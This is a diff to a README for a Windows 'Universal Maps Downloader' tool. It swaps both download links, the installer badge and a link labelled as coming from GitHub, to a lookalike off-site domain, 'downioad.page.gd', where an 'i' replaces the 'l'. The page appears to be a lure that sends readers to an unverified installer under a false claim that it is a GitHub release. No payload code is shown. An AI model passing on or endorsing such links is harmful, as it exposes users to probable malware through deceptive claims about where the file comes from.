@@ -2,7 +2,7 @@
 
 Welcome to the official repository for the Universal Maps Downloader tool. This application provides a straightforward and powerful way to download map imagery and tiles from various online mapping services for offline viewing, research, and personal archiving. The 2026 release focuses on stability, expanded service support, and an enhanced user experience for Windows desktop users.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -53,7 +53,7 @@ A: Yes. Map data is subject to the copyright and terms of service of the respect
 
 Get the latest stable release of the Universal Maps Downloader for Windows.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ---
 
